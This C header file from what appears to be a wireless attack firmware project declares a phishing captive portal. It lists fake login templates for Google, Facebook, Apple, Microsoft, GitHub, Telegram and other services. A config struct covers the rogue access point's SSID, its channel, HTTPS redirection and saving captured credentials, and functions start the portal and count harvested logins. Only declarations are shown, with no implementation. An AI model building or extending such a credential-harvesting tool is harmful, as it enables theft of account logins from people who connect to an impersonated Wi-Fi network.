#ifndef PHISHING_H
#define PHISHING_H
#include "../core/ghost_core.h"

typedef enum {
    PHISH_GOOGLE,
    PHISH_FACEBOOK,
    PHISH_INSTAGRAM,
    PHISH_APPLE,
    PHISH_MICROSOFT,
    PHISH_STEAM,
    PHISH_GITHUB,
    PHISH_TELEGRAM,
    PHISH_VK,
    PHISH_CUSTOM
} phish_template_t;

typedef struct {
    phish_template_t template;
    char custom_html[4096];
    char ssid[32];
    uint8_t channel;
    bool https_redirect;
    bool save_creds;
    uint32_t timeout_sec;
} phishing_config_t;

void phishing_init(void);
void phishing_set_config(phishing_config_t* cfg);
void phishing_start_portal(void);
void phishing_stop_portal(void);
uint16_t phishing_get_creds_count(void);
const char* phishing_get_template_html(phish_template_t t);
#endif
